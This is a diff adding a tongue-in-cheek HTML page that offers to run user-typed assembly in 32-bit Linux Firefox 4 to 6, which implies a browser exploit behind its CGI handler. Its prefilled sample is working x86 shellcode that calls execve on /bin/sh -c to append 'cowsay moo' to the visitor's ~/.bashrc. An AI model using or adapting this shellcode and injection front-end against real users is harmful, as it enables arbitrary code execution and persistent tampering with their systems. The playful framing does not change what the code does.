@@ -1,0 +1,56 @@
+<HTML>
+    <HEAD></HEAD>
+    <BODY>
+        Bringing the power and control of assembly to the browser!
+        <br>
+        <br>
+        Currently only supports 32-bit linux firefox version 4 through 6
+        <br>
+        <br>
+        Type your assembly in the box below. Use intel syntax.
+        <br>
+        The sample program will append "cowsay moo" to your .bashrc for a friendly greeting with each new terminal you open.
+        <FORM ACTION="cgi-bin/assembly.cgi" METHOD="post" ENCTYPE="multipart/form-data">
+            <textarea name="asm" cols="80" rows="40">
+bits 32 ; need this if using a 32 bit firefox binary
+
+; /bin/sh
+mov eax,'//sh'
+shr eax,8
+push eax
+push '/bin'
+mov ebx,esp
+
+; -c
+mov eax,'  -c'
+shr eax,16
+push eax
+mov ecx,esp
+
+;echo cowsay moo >> ~/.bashrc
+mov eax,'Xhrc'
+shr eax,8
+push eax
+push '.bas'
+push '> ~/'
+push 'oo >'
+push 'ay m'
+push 'cows'
+push 'cho '
+push '   e'
+mov edx,esp
+
+xor eax,eax
+push eax
+push edx
+push ecx
+push ebx ; ebx = filename
+mov ecx, esp ; ecx = argv
+cdq ; edx = envp = NULL
+mov al,11 ; execve
+int 0x80
+            </textarea>
+            <INPUT TYPE="submit" NAME="Submit" VALUE="Run Program">
+        </FORM>
+    </BODY>
+</HTML>
